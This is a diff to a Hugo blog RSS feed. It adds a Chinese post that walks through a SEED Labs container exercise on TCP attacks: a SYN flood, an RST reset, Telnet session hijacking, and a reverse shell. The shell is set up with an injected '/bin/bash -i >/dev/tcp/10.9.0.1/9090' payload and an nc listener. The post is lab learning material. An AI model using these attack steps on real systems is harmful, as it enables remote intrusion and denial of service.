@@ -7,7 +7,308 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Thaumazein</copyright>
-        <lastBuildDate>Wed, 13 May 2026 19:17:02 +0800</lastBuildDate><atom:link href="https://th4uma.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 25 May 2026 22:08:02 +0800</lastBuildDate><atom:link href="https://th4uma.github.io/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>TCP协议攻击</title>
+        <link>https://th4uma.github.io/post/tcp/</link>
+        <pubDate>Mon, 25 May 2026 22:08:02 +0800</pubDate>
+        
+        <guid>https://th4uma.github.io/post/tcp/</guid>
+        <description>&lt;img src="https://th4uma.github.io/images/cover/tcp.jpg" alt="Featured image of post TCP协议攻击" /&gt;&lt;h2 id=&#34;实验环境&#34;&gt;实验环境
+&lt;/h2&gt;&lt;h3 id=&#34;容器&#34;&gt;容器
+&lt;/h3&gt;&lt;p&gt;我使用的是 Ubuntu  24.04.4，基本环境配置见&lt;a class=&#34;link&#34; href=&#34;https://th4uma.github.io/post/arp/#%e5%87%86%e5%a4%87&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;ARP攻击原理学习&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;启动实验前，对容器环境进行清理，避免之前的网络配置干扰&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo docker system prune -f
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;1.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;p&gt;进入实验目录并启动&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cd seed-labs/category-network/TCP_Attacks/Labsetup
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo docker compose up -d
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;遇到问题：报错&lt;code&gt;Error response from daemon: Conflict. The container name &amp;quot;/victim-10.9.0.5&amp;quot; is already in use by container &amp;quot;fd7c256895debaee38837cb83046b960c835ac339d2615eeb954516b83a15eda&amp;quot;. You have to remove (or rename) that container to be able to reuse that name.&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;2.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;p&gt;这是因为之前的容器没有停止，而上面的清除命令只会清理无用的网络和停止的容器，最终导致旧容器没有被清理，开启新容器的时候命名冲突。删除旧容器即可&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo docker rm -f victim-10.9.0.5
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/blockquote&gt;
+&lt;p&gt;网络结构包括受害者、攻击者、普通用户&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;节点&lt;/th&gt;
+          &lt;th&gt;IP 地址&lt;/th&gt;
+          &lt;th&gt;作用&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;攻击者&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;10.9.0.1&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;发送伪造 TCP 报文进行攻击&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;受害者&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;10.9.0.5&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;被攻击的 Telnet 客户端&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;普通用户&lt;/td&gt;
+          &lt;td&gt;&lt;code&gt;10.9.0.6&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Telnet 服务端，会话劫持和反向 Shell 的目标&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;打开三个终端分别进入对应的容器&lt;/p&gt;
+&lt;p&gt;攻击者：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker exec -it seed-attacker /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;受害者：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker exec -it victim-10.9.0.5 /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;普通用户：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker exec -it user1-10.9.0.6 /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;syn-洪泛攻击&#34;&gt;SYN 洪泛攻击
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;正常的TCP通信是客户端向服务器发送 SYN，服务器回复 SYN-ACK，然后等待客户端发送 ACK ，收到就连接成功，这三次发送也就是三次握手&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;但如果攻击者一直发送大量 SYN 包而且不发送ACK完成握手，服务器就会保留大量半连接记录，数量多到半连接队列被占满时，如果正常用户需要连接服务器，就会因为服务器资源被占用导致没有办法连接&lt;/p&gt;
+&lt;h3 id=&#34;攻击者&#34;&gt;攻击者
+&lt;/h3&gt;&lt;p&gt;进入攻击者容器，安装编译环境&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get update
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install gcc libc6-dev -y
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;编译攻击程序&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cd volumes
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;gcc synflood.c -o synflood
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;向受害者的 Telnet 端口发送大量 SYN 包&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./synflood 10.9.0.5 23
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;验证&#34;&gt;验证
+&lt;/h3&gt;&lt;p&gt;在普通用户容器里用telnet连接受害者，可以看到一直卡在尝试阶段，无法成功连接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;telnet 10.9.0.5
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;4.png&#34; style=&#34;width: 60%;&#34; /&gt;
+&lt;p&gt;在受害者容器中查看当前 TCP 连接状态，可以看到很多&lt;code&gt;SYN_RECV&lt;/code&gt;连接&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -nat
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;5.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;p&gt;&lt;code&gt;SYN_RECV&lt;/code&gt; 表示服务器收到了 SYN 并回复 SYN-ACK，但还没有收到客户端的 ACK。大量这样的状态说明服务器半连接队列被占用，而telnet无法连接说明队列已经被占满了，导致正常请求进不去，这就是 SYN 洪泛攻击的效果&lt;/p&gt;
+&lt;h2 id=&#34;tcp-重置攻击&#34;&gt;TCP 重置攻击
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;TCP 连接建立后，只要通信一方收到看起来合法的 RST 包，就会将连接关闭&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;攻击者如果能伪造出源 IP、目标 IP、端口和序列号都和当前连接状态相同的 RST 报文，就能强行中断受害者与用户的连接&lt;/p&gt;
+&lt;h3 id=&#34;建立连接&#34;&gt;建立连接
+&lt;/h3&gt;&lt;p&gt;在受害者容器中连接普通用户容器&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;telnet 10.9.0.6
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;6.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;h3 id=&#34;攻击者-1&#34;&gt;攻击者
+&lt;/h3&gt;&lt;p&gt;这里的脚本&lt;/p&gt;
+&lt;p&gt;输入&lt;code&gt;ip addr&lt;/code&gt;确认攻击者容器的网卡名，找到 &lt;code&gt;10.9.0.1&lt;/code&gt; 对应的网卡，我这里是叫&lt;code&gt;br-4e1873a46169&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;3.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;p&gt;打开 &lt;code&gt;reset_auto.py&lt;/code&gt; 和 &lt;code&gt;hijacking_auto.py&lt;/code&gt;，把代码末尾 &lt;code&gt;sniff()&lt;/code&gt; 函数中的 &lt;code&gt;iface&lt;/code&gt; 改成实际网卡名，这里的网卡名必须和本机环境一致，否则脚本可能运行正常，但实际抓不到目标流量&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sniff(iface=&amp;#39;br-4e1873a46169&amp;#39;, filter=f, prn=spoof_pkt)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在攻击者容器中运行重置攻击脚本&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 reset_auto.py 10.9.0.5 10.9.0.6
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;脚本会监听 &lt;code&gt;10.9.0.5&lt;/code&gt; 和 &lt;code&gt;10.9.0.6&lt;/code&gt; 之间的 TCP 流量，并根据捕获到的数据包构造对应的 RST 报文&lt;/p&gt;
+&lt;img src=&#34;7.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;h3 id=&#34;验证-1&#34;&gt;验证
+&lt;/h3&gt;&lt;p&gt;回到受害者的 Telnet 界面，随便按下一个键触发通信&lt;/p&gt;
+&lt;p&gt;如果攻击成功，连接会被强制关闭&lt;/p&gt;
+&lt;img src=&#34;8.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;p&gt;这说明攻击者伪造的 RST 包被当前 TCP 会话接受，Telnet 连接被远程关闭&lt;/p&gt;
+&lt;h2 id=&#34;tcp-会话劫持&#34;&gt;TCP 会话劫持
+&lt;/h2&gt;&lt;p&gt;TCP 会话劫持的目标不是断开连接，而是向已有连接中注入数据。Telnet 这种明文协议没有额外的加密和完整性保护，只要攻击者能构造出符合当前 TCP 状态的数据包，服务端就可能把注入内容当作真实客户端发送的数据处理&lt;/p&gt;
+&lt;p&gt;本实验中，攻击者会劫持 &lt;code&gt;10.9.0.5&lt;/code&gt; 到 &lt;code&gt;10.9.0.6&lt;/code&gt; 的 Telnet 会话，并向服务端注入命令，让服务端创建 &lt;code&gt;/tmp/success&lt;/code&gt; 文件&lt;/p&gt;
+&lt;h3 id=&#34;建立连接-1&#34;&gt;建立连接
+&lt;/h3&gt;&lt;p&gt;在受害者容器中登录普通用户容器&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;telnet 10.9.0.6
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;登录账号为 &lt;code&gt;seed&lt;/code&gt;，密码为 &lt;code&gt;dees&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;攻击者-2&#34;&gt;攻击者
+&lt;/h3&gt;&lt;p&gt;在攻击者容器中运行会话劫持脚本&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 hijacking_auto.py 10.9.0.5 10.9.0.6
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;9.png&#34; style=&#34;width: 90%;&#34; /&gt;
+&lt;p&gt;脚本会等待目标连接产生数据包，然后根据当前连接状态构造注入包。这里脚本设置了序列号偏移量，所以需要在受害者 Telnet 界面中连续输入 10 个字符来触发攻击&lt;/p&gt;
+&lt;h3 id=&#34;验证-2&#34;&gt;验证
+&lt;/h3&gt;&lt;p&gt;在受害者 Telnet 界面中连续输入 10 个字符&lt;/p&gt;
+&lt;p&gt;然后在普通用户容器中查看 &lt;code&gt;/tmp/success&lt;/code&gt; 是否被创建&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -l /tmp/success
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;10.png&#34; style=&#34;width: 80%;&#34; /&gt;
+&lt;p&gt;如果能够看到 &lt;code&gt;/tmp/success&lt;/code&gt; 文件，说明攻击者注入的命令已经被 &lt;code&gt;10.9.0.6&lt;/code&gt; 执行，会话劫持成功&lt;/p&gt;
+&lt;h2 id=&#34;反向-shell-攻击&#34;&gt;反向 Shell 攻击
+&lt;/h2&gt;&lt;p&gt;反向 Shell 是在会话劫持基础上的进一步利用。前面的会话劫持只是注入一条创建文件的命令，如果把注入内容改成反向连接命令，就可以让目标主机主动连接攻击者，并把命令执行环境交给攻击者&lt;/p&gt;
+&lt;p&gt;这里的攻击依然发生在实验容器网络中，目标是让 &lt;code&gt;10.9.0.6&lt;/code&gt; 主动连接攻击者 &lt;code&gt;10.9.0.1&lt;/code&gt; 的 &lt;code&gt;9090&lt;/code&gt; 端口&lt;/p&gt;
+&lt;h3 id=&#34;修改脚本&#34;&gt;修改脚本
+&lt;/h3&gt;&lt;p&gt;打开 &lt;code&gt;hijacking_auto.py&lt;/code&gt;，注释掉原来的 &lt;code&gt;touch&lt;/code&gt; 命令，改为反向 Shell 命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;data = &amp;#34;\n/bin/bash -i &amp;gt;/dev/tcp/10.9.0.1/9090 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1\n&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这条命令会让目标主机启动一个交互式 Bash，并把输入输出重定向到攻击者的 &lt;code&gt;9090&lt;/code&gt; 端口&lt;/p&gt;
+&lt;h3 id=&#34;攻击者监听&#34;&gt;攻击者监听
+&lt;/h3&gt;&lt;p&gt;在攻击者容器中新开一个终端窗口，监听 &lt;code&gt;9090&lt;/code&gt; 端口&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lnv 9090
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;11.png&#34; style=&#34;width: 80%;&#34; /&gt;
